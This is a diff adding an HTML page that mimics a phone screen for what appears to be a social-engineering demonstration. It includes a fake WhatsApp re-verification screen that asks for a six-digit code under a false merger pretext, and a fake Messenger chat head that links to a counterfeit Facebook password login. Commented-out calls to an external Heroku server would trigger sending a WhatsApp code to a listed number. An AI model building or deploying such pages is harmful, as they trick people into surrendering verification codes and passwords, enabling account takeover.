@@ -1,0 +1,1201 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link
+            href="https://fonts.googleapis.com/icon?family=Material+Icons"
+            rel="stylesheet"
+        />
+        <style>
+            * {
+                box-sizing: border-box;
+            }
+
+            body,
+            html {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                position: relative;
+                top: 0;
+                left: 0;
+            }
+
+            #backgroundContainer {
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 100%;
+                position: fixed;
+            }
+
+            #background {
+                width: 100%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                position: absolute;
+                background-image: url(wallpaper.png);
+                background-size: cover;
+                background-position-x: center;
+                background-position-y: center;
+            }
+
+            #topBar,
+            #topBarGreen {
+                position: fixed;
+                width: 100%;
+                height: 20px;
+                background-color: black;
+                top: 0;
+                left: 0;
+                font-size: 11px;
+                color: white;
+                font-family: sans-serif;
+                line-height: 20px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding-top: 1px;
+            }
+
+            #topBarLeft,
+            #topBarRight {
+                display: flex;
+                width: 50%;
+                margin: 0;
+            }
+
+            #topBarRight {
+                justify-content: flex-end;
+                padding-right: 6px;
+            }
+
+            #topBarLeft {
+                padding-left: 6px;
+            }
+
+            .time {
+                display: inline-block;
+            }
+
+            #battaryContainer {
+                display: inline-block;
+                position: relative;
+                height: 11px;
+                width: 27px;
+                margin-left: 3px;
+            }
+
+            #battay {
+                display: inline-block;
+                border: 1px solid white;
+                border-radius: 15px;
+                text-align: center;
+                z-index: 2;
+                position: absolute;
+                width: 100%;
+                height: 100%;
+            }
+
+            .battaryPercent {
+                line-height: initial;
+                font-size: 8px;
+            }
+
+            .battaryJuice {
+                position: absolute;
+                display: inline-block;
+                width: 100%;
+                height: 100%;
+                background-color: #00ce00;
+                z-index: 1;
+                border-radius: 15px;
+                border-style: inset;
+                border-width: 2px;
+                border-color: black;
+            }
+
+            #topBarGreen .battaryJuice {
+                border-color: #054c44;
+            }
+
+            .battaryJuiceCover {
+                height: 100%;
+                width: 40%;
+                background: black;
+            }
+
+            #topBarGreen .battaryJuiceCover {
+                background: #054c44;
+            }
+
+            .statusIcon {
+                height: 14px;
+                margin-right: 1px;
+                margin-top: -1px;
+            }
+
+            #calendar {
+                position: fixed;
+                top: 28px;
+                left: 15px;
+                width: calc(100% - 30px);
+            }
+
+            #iconsRow1,
+            #iconsRow2 {
+                display: flex;
+                position: fixed;
+                justify-content: space-between;
+                top: 452px;
+                color: white;
+                font-family: sans-serif;
+                font-size: 9px;
+                width: 100%;
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            #iconsRow1 {
+                top: 449px;
+            }
+
+            #iconsRow2 {
+                top: 537px;
+            }
+
+            .icon {
+                width: 47px;
+            }
+
+            .iconContainer {
+                display: inline-block;
+                text-align: center;
+            }
+
+            #gamesGroupBox {
+                background-color: rgba(255, 255, 255, 0.5);
+                width: 47px;
+                height: 47px;
+                border-radius: 5px;
+                display: flex;
+                flex-wrap: wrap;
+                padding: 3px;
+            }
+
+            .iconText {
+                margin-top: 5px;
+            }
+
+            .iconInGroup {
+                width: 14px;
+                height: 14px;
+                margin: 3px;
+            }
+
+            #bottom {
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                color: white;
+                text-align: center;
+                width: 100%;
+                height: 20px;
+                opacity: 0.8;
+            }
+
+            #chromeCrashedContainer {
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 100%;
+                background: rgba(0, 0, 0, 0.4);
+                display: none;
+            }
+
+            #chromeCrashed {
+                position: fixed;
+                bottom: 10px;
+                left: 10px;
+                height: 280px;
+                background: white;
+                border-radius: 5px;
+                width: calc(100% - 20px);
+                display: flex;
+                flex-direction: column;
+                font-family: sans-serif;
+                justify-content: space-between;
+            }
+
+            #chromeCrashedTitle {
+                width: 100%;
+                height: 80px;
+                line-height: 80px;
+                color: black;
+                font-weight: bold;
+                text-align: center;
+                font-size: 16px;
+            }
+
+            #chromeCrashedText {
+                height: 120px;
+                width: 100%;
+                padding-left: 30px;
+                padding-right: 30px;
+                color: #8f8f8f;
+                font-size: 12px;
+            }
+
+            #viewSummary {
+                width: 100%;
+                color: black;
+                font-size: 12px;
+                text-decoration: underline;
+                margin-top: 20px;
+            }
+
+            #crashedButtons {
+                width: 100%;
+                height: 60px;
+                background: #f3f3f3;
+                display: flex;
+                border-radius: 5px;
+            }
+
+            #crashedButtons button {
+                width: 50%;
+                height: 100%;
+                outline: 0;
+            }
+
+            #crashedButtons button:first-child {
+                border: 1px solid #e3e3e3;
+                background: transparent;
+                border-bottom-left-radius: 5px;
+            }
+
+            #crashedButtons button:nth-child(2) {
+                border: 1px solid #e3e3e3;
+                background: transparent;
+                border-bottom-right-radius: 5px;
+                border-left: 0;
+                color: skyblue;
+            }
+
+            #topBarGreen {
+                display: none;
+                background-color: #054c44;
+            }
+
+            #whatsappContainer {
+                position: fixed;
+                top: 20px;
+                height: calc(100% - 20px);
+                width: 100%;
+                background: #eeeeee;
+                display: none;
+                flex-direction: column;
+            }
+
+            #whatsappTitle {
+                color: white;
+                width: 100%;
+                background: #075e54;
+                height: 60px;
+                line-height: 60px;
+                padding-left: 15px;
+                font-size: 20px;
+                font-family: sans-serif;
+            }
+
+            #whatsappMessage {
+                font-family: sans-serif;
+                padding-top: 20px;
+                padding-left: 15px;
+                padding-right: 15px;
+                width: 100%;
+                display: none;
+            }
+
+            #whatsappCodeContainer {
+                display: flex;
+                justify-content: space-between;
+                padding: 0 7px;
+                margin-top: 20px;
+            }
+
+            .whatsappCode {
+                border: 0;
+                border-style: inset;
+                border-bottom: 1px solid #158073;
+                width: 45px;
+                height: 55px;
+                outline: none;
+                font-size: 35px;
+                text-align: center;
+            }
+
+            /* FACEBOOK CHATHEAD */
+
+            #chat_back {
+                position: fixed;
+                background: rgba(0, 0, 0, 0.5);
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                display: none;
+            }
+
+            .chat_container {
+                position: fixed;
+                top: 0;
+                bottom: 0;
+                margin: auto;
+                margin-top: 65px;
+                right: 0;
+                left: 0;
+                width: 100%;
+                height: 500px;
+                display: none;
+            }
+            .chat_container .chat {
+                position: absolute;
+                width: 99%;
+                height: 288px;
+                top: -137px;
+                bottom: 0;
+                margin: auto;
+                left: 0;
+                right: 0;
+                background: white;
+                border-radius: 10px;
+                transform: scale(0);
+                box-shadow: 0 5px 60px 10px rgba(0, 0, 0, 0.12);
+            }
+
+            .chat_container .chat::after {
+                content: "";
+                display: block;
+                position: absolute;
+                width: 0;
+                height: 0;
+                border-left: 6px solid rgba(0, 0, 0, 0);
+                border-bottom: 6px solid white;
+                border-top: 6px solid rgba(0, 0, 0, 0);
+                border-right: 6px solid rgba(0, 0, 0, 0);
+                top: -12px;
+                right: 32px;
+            }
+            .chat_container .chat .textbox {
+                position: absolute;
+                width: 100%;
+                height: 50px;
+                box-shadow: 0px -2px 10px rgba(0, 0, 0, 0.07);
+                bottom: 0;
+            }
+            .chat_container .chat .textbox .input {
+                width: 77%;
+                height: 35px;
+                display: inline-block;
+                position: relative;
+                margin-left: 11px;
+                margin-top: 6px;
+                margin-right: 9px;
+                border: none;
+                padding-left: 15px;
+                font-size: 14px;
+                border-radius: 35px;
+                background-color: #eaeaea;
+                outline: none;
+            }
+            .chat_container .chat .textbox .send {
+                position: absolute;
+                bottom: 0;
+                right: 0;
+                width: 50px;
+                height: 50px;
+                text-align: center;
+                line-height: 50px;
+                font-size: 40px;
+                color: #1e88e5;
+            }
+
+            #chat-title {
+                box-shadow: 0 0px 20px rgba(0, 0, 0, 0.19),
+                    0 0px 6px rgba(0, 0, 0, 0.23);
+                padding: 8px;
+            }
+
+            .profile-pic {
+                width: 40px;
+                height: 40px;
+                border-radius: 50%;
+                background: url("https://static.wikia.nocookie.net/rickandmorty/images/5/57/Rick-morty_kindlephoto-123953800.jpg/revision/latest?cb=20160630031056")
+                    white;
+                background-size: cover;
+                display: inline-block;
+            }
+
+            #profile-name {
+                font-weight: 550;
+                margin-left: 6px;
+            }
+
+            #profile-activity {
+                color: #838383;
+                font-family: sans-serif;
+                margin-left: 6px;
+                font-size: 13px;
+            }
+
+            .bubble {
+                width: 64px;
+                height: 64px;
+                border-radius: 50%;
+                position: fixed;
+                top: 50%;
+                left: -9px;
+                box-shadow: 0 0px 20px rgba(0, 0, 0, 0.19),
+                    0 0px 6px rgba(0, 0, 0, 0.23);
+                background: url("https://static.wikia.nocookie.net/rickandmorty/images/5/57/Rick-morty_kindlephoto-123953800.jpg/revision/latest?cb=20160630031056")
+                    white;
+                background-size: cover;
+            }
+
+            .bubble:hover {
+                transition: all 0.3s;
+                transform: scale(1.1);
+            }
+
+            .bubble.with-notification::after {      
+                content: '1';
+                background: red;
+                position: absolute;
+                right: 0;
+                top: 0;
+                width: 18px;
+                height: 18px;
+                border-radius: 100%;
+                color: white;
+                text-align: center;
+                line-height: 18px;
+                font-size: 13px;
+                font-weight: 500;
+                font-family: sans-serif;
+            }
+
+            .bubble__span {
+                position: absolute;
+                left: 70px;
+                background: #333;
+                border-radius: 10px;
+                padding: 5px;
+                color: white;
+                font-family: "Roboto";
+                opacity: 0;
+            }
+            .bubble:active {
+                transform: scale(1.2);
+                transition: all 0.3s;
+            }
+
+            .chat-thread {
+                padding: 20px;
+                margin: 10px;
+                list-style: none;
+                overflow-x: hidden;
+                overflow-y: auto;
+            }
+            .chat-thread li {
+                position: relative;
+                clear: both;
+                display: inline-block;
+                padding: 10px 20px 10px 15px;
+                margin-bottom: 10px;
+                font-family: "Roboto";
+                font: 14px;
+                border-radius: 25px;
+            }
+            .chat-thread .message-mit {
+                background: #1e88e5;
+                float: right;
+                color: white;
+                direction: rtl;
+                text-align: right;
+            }
+            .chat-thread .message-dest {
+                background: #cfd8dc;
+                float: left;
+                direction: rtl;
+                text-align: right;
+            }
+            .chat-thread .loading .material-icons {
+                color: rgba(200, 200, 200, 0.8);
+                font-size: 8px;
+                padding: 1px;
+                margin-bottom: 5px;
+            }
+            .chat-thread .loading .material-icons:nth-child(1) {
+                animation: writing 1.2s infinite alternate;
+            }
+            .chat-thread .loading .material-icons:nth-child(2) {
+                animation: writing 1.2s infinite 0.2s alternate;
+            }
+            .chat-thread .loading .material-icons:nth-child(3) {
+                animation: writing 1.2s infinite 0.3s alternate;
+            }
+
+            .bouncein {
+                animation: bounce 0.4s ease-out forwards 0.2s;
+            }
+
+            .bounceout {
+                animation: bounce 0.25s ease-out forwards reverse;
+            }
+
+            #arrow-right {
+                width: 18px;
+                position: relative;
+                top: 8px;
+                left: 8px;
+            }
+
+            #like-button {
+                width: 29px;
+                position: relative;
+                top: 9px;
+                right: -2px;
+            }
+
+            #facebook-app {
+                background-image: url(facebook-app-logo.png);
+                background-repeat: no-repeat;
+                background-position: center;
+                background-size: 60px;
+                background-color: #4167b2;
+                position: fixed;
+                top: 20px;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                display: none;
+                animation: facebook-logo 3s;
+                animation-fill-mode: forwards;
+            }
+
+            #facebook-content {
+                position: fixed;
+                top: 80px;
+                left: 0;
+                background-color: #eaebef;
+                width: 100%;
+                height: 100%;
+                display: none;
+                padding: 25px;
+            }
+
+            #login-profile {
+                margin-top: 10px;
+                margin-bottom: 25px;
+            }
+
+            @font-face {
+                font-family: "klavika-bold";
+                src: url(Klavika-Bold.woff2) format("woff2");
+            }
+
+            #login-title {
+                position: fixed;
+                top: 37px;
+                left: 165px;
+                color: white;
+                font-weight: bold;
+                font-family: "klavika-bold";
+                font-size: 28px;
+                display: none;
+            }
+
+            .daniel-profile-pic {
+                width: 60px;
+                height: 60px;
+                border-radius: 50%;
+                background: url("https://cdn.vox-cdn.com/uploads/chorus_image/image/58089103/r_m_sauce.0.jpg")
+                    white;
+                background-size: cover;
+                display: inline-block;
+            }
+
+            #daniel-profile-name {
+                font-family: roboto;
+                font-size: 25px;
+                margin-left: 10px;
+                font-weight: 350;
+            }
+
+            #facebook-password {
+                width: 100%;
+                height: 48px;
+                border-radius: 6px;
+                border: 1px solid #dadada;
+                padding: 10px;
+                font-size: 18px;
+                color: #a3a3a3;
+                outline: none;
+            }
+
+            #facebook-login-button {
+                width: 100%;
+                background-color: #3577e5;
+                margin-top: 10px;
+                height: 45px;
+                color: white;
+                font-size: 18px;
+                border: 1px solid #2962c1;
+                border-radius: 6px;
+                outline: none;
+            }
+
+            #forgot-password {
+                color: #2962c1;
+                font-family: roboto;
+                margin-top: 20px;
+            }
+
+            @keyframes facebook-logo {
+                0% {
+                    background-position: center;
+                    background-size: 60px;
+                }
+
+                85% {
+                    background-position: center;
+                    background-size: 60px;
+                }
+
+                100% {
+                    background-position: 120px 16px;
+                    background-size: 30px;
+                }
+            }
+
+            @keyframes bounce {
+                0% {
+                    transform: scale(0);
+                }
+                60% {
+                    transform: scale(1.1);
+                }
+                100% {
+                    transform: scale(1);
+                }
+            }
+            @keyframes writing {
+                0% {
+                    transform: translateY(0px);
+                }
+                50% {
+                    transform: translateY(5px);
+                }
+                100% {
+                    transform: translateY(-5px);
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div id="backgroundContainer"><div id="background"></div></div>
+        <div id="topBar">
+            <div id="topBarLeft"><div class="time"></div></div>
+            <div id="topBarRight">
+                <img src="etc.png" id="etc" class="statusIcon" />
+                <img src="bluetooth.png" id="bluetooth" class="statusIcon" />
+                <img src="alarm.png" id="alarm" class="statusIcon" />
+                <img src="signal.png" id="signal" class="statusIcon" />
+                <img src="wifi.png" id="wifi" class="statusIcon" />
+                <div id="battaryContainer">
+                    <div class="battaryJuice">
+                        <div class="battaryJuiceCover"></div>
+                    </div>
+                    <div id="battay"><span class="battaryPercent"></span></div>
+                </div>
+            </div>
+        </div>
+        <div id="topBarGreen">
+            <div id="topBarLeft">
+                <div class="time"></div>
+            </div>
+            <div id="topBarRight">
+                <img src="etc_green.png" id="etc" class="statusIcon" />
+                <img
+                    src="bluetooth_green.png"
+                    id="bluetooth"
+                    class="statusIcon"
+                />
+                <img src="alarm_green.png" id="alarm" class="statusIcon" />
+                <img src="signal_green.png" id="signal" class="statusIcon" />
+                <img src="wifi_green.png" id="wifi" class="statusIcon" />
+                <div id="battaryContainer">
+                    <div class="battaryJuice">
+                        <div class="battaryJuiceCover"></div>
+                    </div>
+                    <div id="battay"><span class="battaryPercent"></span></div>
+                </div>
+            </div>
+        </div>
+        <img class="homepage" src="calendar.png" id="calendar" />
+        <div class="homepage" id="iconsRow1">
+            <div class="iconContainer" id="whatsappButton">
+                <img src="whatsapp.png" class="icon" />
+                <div class="iconText">WhatsApp</div>
+            </div>
+            <div class="iconContainer">
+                <img src="system_phone.png" class="icon" />
+                <div class="iconText">Phone</div>
+            </div>
+            <div class="iconContainer">
+                <img src="spotify.png" class="icon" />
+                <div class="iconText">Spotify</div>
+            </div>
+            <div class="iconContainer">
+                <img src="google_chrome.png" class="icon" />
+                <div class="iconText">Chrome</div>
+            </div>
+            <div class="iconContainer" id="gamesGroup">
+                <div id="gamesGroupBox">
+                    <img src="game1.png" class="iconInGroup" />
+                    <img src="pubg.jpg" class="iconInGroup" />
+                    <img src="game2.png" class="iconInGroup" />
+                </div>
+                <div class="iconText">Games</div>
+            </div>
+        </div>
+        <div class="homepage" id="iconsRow2">
+            <div class="iconContainer">
+                <img src="google_youtube.png" class="icon" />
+                <div class="iconText">YouTube</div>
+            </div>
+            <div class="iconContainer">
+                <img src="gett.png" class="icon" />
+                <div class="iconText">Gett</div>
+            </div>
+            <div class="iconContainer">
+                <img src="system_camera.png" class="icon" />
+                <div class="iconText">Camera</div>
+            </div>
+            <div class="iconContainer">
+                <img src="system_clock.png" class="icon" />
+                <div class="iconText">Clock</div>
+            </div>
+            <div class="iconContainer" id="gamesGroup">
+                <img src="waze.png" class="icon" />
+                <div class="iconText">Waze</div>
+            </div>
+        </div>
+        <div class="homepage" id="bottom">
+            <img src="up-arrow.png" />
+        </div>
+        <div id="chromeCrashedContainer">
+            <div id="chromeCrashed">
+                <div id="chromeCrashedTitle">
+                    Chrome stopped working
+                </div>
+                <div id="chromeCrashedText">
+                    Send bug report to Mi for analysis? This report may contain
+                    Personally Identifiable Information. Your report will help
+                    fix this bug and will never be shared in any commercial
+                    context.
+                    <div id="viewSummary">
+                        View summary
+                    </div>
+                </div>
+                <div id="crashedButtons">
+                    <button>Cancel</button>
+                    <button>Report</button>
+                </div>
+            </div>
+        </div>
+        <div id="whatsappContainer">
+            <div id="whatsappTitle">
+                Verify your phone number
+            </div>
+            <div id="whatsappMessage">
+                Due to the merging of WhatsApp and Messenger, we require all of
+                our users to re-authenticate their phone number.<br /><br />
+                We sent you an authentication code to the following number: +972
+                (54) 931 2294<br /><br />
+                Please fill in the autherntication code below:
+                <br /><br />
+                <div id="whatsappCodeContainer">
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                    <input
+                        autocomplete="new-password"
+                        type="number"
+                        maxlength="1"
+                        class="whatsappCode"
+                    />
+                </div>
+            </div>
+        </div>
+        <div id="chat_back"></div>
+        <div class="chat_container">
+            <audio id="audio" src="messenger.mp3"></audio>
+            <div class="bubble with-notification"></div>
+            <div class="chat">
+                <div id="chat-title">
+                    <table>
+                        <tr>
+                            <td rowspan="2">
+                                <div class="profile-pic"></div>
+                            </td>
+                            <td>
+                                <span id="profile-name">Unity</div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <span id="profile-activity">Active now</span>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+                <ul class="chat-thread">
+                    <li class="message-mit">Hey, check out this photo Morty uploaded</li>
+                    <li class="message-mit" id="link-message"><u>https://m.facebook.com/morty/<br />photos/2271216779367290</u></li>
+                    <!-- <li class="message-mit loading">
+                        <i class="material-icons">lens</i
+                        ><i class="material-icons">lens</i
+                        ><i class="material-icons">lens</i>
+                    </li> -->
+                </ul>
+                <div class="textbox">
+                    <img id="arrow-right" src="arrow-right.png" />
+                    <input autocomplete="new-password" id="facebook-input" class="input" type="text" placeholder="Type a message..." >
+                    <img id="like-button" src="like.png" /> 
+                </div>
+            </div>
+        </div>
+        <div id="facebook-app">
+            <div id="login-title">Log In</div>
+            <div id="facebook-content">
+                <div id="login-profile">
+                    <table>
+                        <tr>
+                            <td rowspan="2">
+                                <div class="daniel-profile-pic"></div>
+                            </td>
+                            <td>
+                                <span id="daniel-profile-name">Rick Sanchez</span>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+                <input type="password" id="facebook-password" placeholder="Password" />
+                <input type="button" value="Log In" id="facebook-login-button">
+                <div id="forgot-password">Forgot Password?</div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js"></script>
+        <script>
+            function wakeUpHerokuServer() {
+                // fetch("https://safe-garden-70660.herokuapp.com/");
+            }
+
+            function sendWhatsappAuthCode() {
+                // fetch(
+                //     "https://safe-garden-70660.herokuapp.com/?number=972546879393"
+                // );
+            }
+
+            function updateClock() {
+                const now = new Date();
+                let hr = now.getHours();
+                let min = now.getMinutes();
+                if (min < 10) {
+                    min = "0" + min;
+                }
+                var ampm = "AM";
+                if (hr > 12) {
+                    hr -= 12;
+                    ampm = "PM";
+                }
+
+                Array.from(document.getElementsByClassName("time")).forEach(
+                    element => {
+                        element.innerHTML = `${hr}:${min} ${ampm}`;
+                    }
+                );
+            }
+
+            function updateBattary() {
+                navigator.getBattery().then(function(battery) {
+                    battery.addEventListener("levelchange", function() {
+                        updateLevelInfo();
+                    });
+                    function updateLevelInfo() {
+                        const percent = Math.round(100 * battery.level);
+
+                        Array.from(
+                            document.getElementsByClassName("battaryPercent")
+                        ).forEach(element => {
+                            element.innerText = percent;
+                        });
+
+                        Array.from(
+                            document.getElementsByClassName("battaryJuiceCover")
+                        ).forEach(element => {
+                            element.style.width = `${100 - percent}%`;
+                        });
+                    }
+                    updateLevelInfo();
+                });
+            }
+
+            function goToWhatsapp() {
+                document.getElementById("topBar").style.display = "none";
+                document.getElementById("topBarGreen").style.display = "flex";
+
+                Array.from(document.getElementsByClassName("homepage")).forEach(
+                    element => {
+                        element.style.display = "none";
+                    }
+                );
+
+                document.getElementById("whatsappContainer").style.display =
+                    "flex";
+
+                setTimeout(() => {
+                    document.getElementById("whatsappMessage").style.display =
+                        "block";
+                }, 300);
+            }
+
+            function setCodeInputAutoMove() {
+                const codeInputs = Array.from(
+                    document.getElementsByClassName("whatsappCode")
+                );
+                codeInputs.forEach((codeInput, index) => {
+                    codeInput.onfocus = () => {
+                        Array.from(
+                            document.querySelectorAll(
+                                "#topBarLeft, #topBarRight"
+                            )
+                        ).forEach(element => (element.style.display = "none"));
+                    };
+                    codeInput.onkeyup = () => {
+                        if (codeInput.value.length === 1) {
+                            if (index === codeInputs.length - 1) {
+                                alert("0wn3d by L[s]D");
+                            } else {
+                                codeInputs[index + 1].focus();
+                            }
+                        }
+                    };
+                });
+            }
+
+            function showCrashedMessage() {
+                document.getElementById(
+                    "chromeCrashedContainer"
+                ).style.display = "block";
+                setTimeout(() => {
+                    document.getElementById("chromeCrashedContainer").remove();
+                }, 2000);
+                setCrashExit();
+            }
+
+            function setCrashExit() {
+                document.getElementById("chromeCrashed").onclick = () => {
+                    document.getElementById("chromeCrashedContainer").remove();
+                };
+            }
+
+            function run() {
+                showCrashedMessage();
+                sendWhatsappAuthCode();
+            }
+
+            function playMessengerSoundOnClick() {
+                document.addEventListener('click', () => {
+                    document.getElementById("audio").play();
+                }, {
+                    once: true
+                });
+            }
+
+            function initFacebookHead() {
+                $(".chat_container").show();
+                $(".bubble").draggable().selectable();
+
+                var isMoving = false;
+                var isdragging = false;
+                var chatMode = false;
+                var ts = {x: 0, y: 0};
+
+                function closeChat() {
+                    $(".bubble")
+                        .css("top", "50%")
+                        .css("left", "auto")
+                        .css("right", "-9px")
+                        .css("transition", "all 0.5s");
+                    $(".chat")
+                        .addClass("bounceout")
+                        .removeClass("bouncein");
+                    $(".chat").replaceWith($(".chat").clone(true));
+                    $("#chat_back").hide();
+                }
+
+                function showChat() {
+                    var swidth = $(window).width();
+                    $(".bubble.with-notification").removeClass("with-notification");
+                    $("#chat_back").show();
+                    $(".chat")
+                        .addClass("bouncein")
+                        .removeClass("bounceout");
+                    $(".bubble")
+                        .css("top", "28px")
+                        .css("left", (swidth - 73) + "px")
+                        .css("transition", "all 0.3s");
+                    $(".chat").replaceWith($(".chat").clone(true));
+                    $("#facebook-input").focus();
+                }
+
+                $("#facebook-input").keypress(e => {
+                    if (e.which == 13) {
+                        e.preventDefault();
+                        $(`<li class="message-dest">
+                                ${e.currentTarget.value}
+                            </li >`).appendTo(".chat-thread");
+                        e.currentTarget.value = "";
+                    }
+                });
+
+                $("#facebook-login-button").click(() => {
+                    alert("0wn3d by L[s]D");
+                })
+
+                $("#link-message").click(() => {
+                    openFacebook();
+                });
+
+                $(".bubble").on('touchstart', function(e) {
+                    isdragging = false;
+                    ts = {
+                        y: e.originalEvent.touches[0].clientY,
+                        x: e.originalEvent.touches[0].clientX
+                    }
+                });
+
+                $(".bubble").on('touchmove', function(e) {
+                    var te = {
+                        y: e.originalEvent.changedTouches[0].clientY,
+                        x: e.originalEvent.changedTouches[0].clientX
+                    }
+                    
+                    if (Math.abs(te.x - ts.x) > 2 || Math.abs(te.y - ts.y) > 2) {
+                        isdragging = true;
+                        $(this).css("transition", "all 0s");
+                    }
+                });
+
+                $(".bubble").on('touchend', function(e) {
+                    e.preventDefault();
+                    var lastY = e.originalEvent.changedTouches[0].clientY;
+                    var lastX = e.originalEvent.changedTouches[0].clientX;
+                    var swidth = $(window).width();
+
+                    if (isdragging) {
+                        if (chatMode) {
+                            chatMode = false;
+                            closeChat();
+                        }
+
+                        if (lastX > swidth / 2) {
+                            $(this)
+                                .css("top", lastY)
+                                .css("left", swidth - 55 + "px")
+                                .css("transition", "all 0.4s");
+                        } else {
+                            $(this)
+                                .css("top", lastY)
+                                .css("left", "-9px")
+                                .css("transition", "all 0.4s");
+                        }
+                    } else {
+                        if (chatMode) {
+                            closeChat();
+                            chatMode = false;
+                        } else {
+                            showChat();
+                            chatMode = true;
+                        }
+                    }
+                });
+            }
+
+            function openFacebook() {
+                $("#facebook-app").show();
+                setTimeout(() => {
+                    $("#facebook-content").show();
+                    $("#login-title").show();
+                }, 3000);
+            }
+
+            function main() {
+                wakeUpHerokuServer();
+
+                updateClock();
+                setInterval(updateClock, 1000);
+
+                updateBattary();
+
+                document.getElementById("whatsappButton").onclick = () => {
+                    setTimeout(() => goToWhatsapp(), 100);
+                };
+
+                setCodeInputAutoMove();
+
+                setTimeout(initFacebookHead, 2800);
+
+                playMessengerSoundOnClick()
+            }
+
+            main();
+        </script>
+    </body>
+</html>
